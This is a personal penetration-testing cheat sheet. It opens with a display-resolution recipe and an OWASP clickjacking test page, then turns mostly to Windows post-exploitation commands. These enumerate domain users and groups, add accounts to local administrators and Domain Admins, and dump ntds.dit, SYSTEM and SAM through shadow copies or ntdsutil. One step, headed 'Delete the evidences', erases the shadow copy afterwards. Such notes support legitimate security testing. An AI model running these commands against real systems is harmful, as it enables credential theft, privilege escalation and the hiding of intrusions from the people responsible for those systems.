# Cheat Sheets
My cheatsheets

## Add new resolution

```bash
$ cvt 1920 1080 60
# 1920x1080 59.96 Hz (CVT 2.07M9) hsync: 67.16 kHz; pclk: 173.00 MHz
Modeline "1920x1080_60.00"  173.00  1920 2048 2248 2576  1080 1083 1088 1120 -hsync +vsync

$ xrandr --newmode "1920x1080_60.00"  173.00  1920 2048 2248 2576  1080 1083 1088 1120 -hsync +vsync
$ xrandr --addmode Virtual1 1920x1080_60.00
```
## Clickjacking Test
[Owasp](https://www.owasp.org/index.php/Testing_for_Clickjacking_(OTG-CLIENT-009))
```html
<html> 

   <head> 

     <title>Clickjack test page</title> 

   </head> 

   <body> 

     <p>Website is vulnerable to clickjacking!</p> 

     <iframe src="URL" width="500" height="500"></iframe> 

   </body> 

</html>
```

## Spawn shell with given user,only for network purpose
Windows
```cmd
runas /netonly /user:domain\account cmd
```

## Useful commands Windows Post Exploitation

**Get Domain Controller name**
```cmd
C:\Users\User> nltest /dclist:DOMAIN
C:\Users\User> echo %LOGONSERVER%
```

**Domain Users**
```cmd
C:\Users\User> net users /domain
```

**Domain Groups**
```cmd
C:\Users\User> net groups /domain
```

**List the users of specific group**
```cmd
C:\Users\User> net groups "Domain Admins" /domain
```

**Add new user**
```cmd
C:\Users\User> net user USER PASS /add
```

**Delete user**
```cmd
C:\Users\User> net user USER /del
```

**List Local Groups**
```cmd
C:\Users\User> net localgroups
```

**Add user to Local Admin Group**
```cmd
C:\Users\User> net localgroup administrators USER /add
```

**Add user to Domain Amdins**
```cmd
C:\Users\User> net groups "Domain Admins" USER /add
```

**Account Password Policy**
```cmd
C:\Users\User> net accounts /domain
```

## HashDump with Windows Tools

+ **Shadow Copy**

1. Check if there is any Shadow Copy
```cmd
vssadmin list shadows
```

2. Create a Shadow Copy Volume
```cmd
vssadmin create shadow /for=X:  //Where X is the HDD where is the el ntds.dit file
```

3. Copy ntds.dit, SYSYEM and SAM
```cmd
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy[X]\windows\ntds\ntds.dit .
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy[X]\windows\system32\config\SYSTEM .
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy[X]\windows\system32\config\SAM .
```

4. Delete the evidences
```cmd
vssadmin delete shadows /for=X:
```

+ NTDSUTIL
```cmd
C:\>ntdsutil
ntdsutil: activate instance ntds
ntdsutil: ifm
ifm: create full c:\pentest
ifm: quit
ntdsutil: quit
```
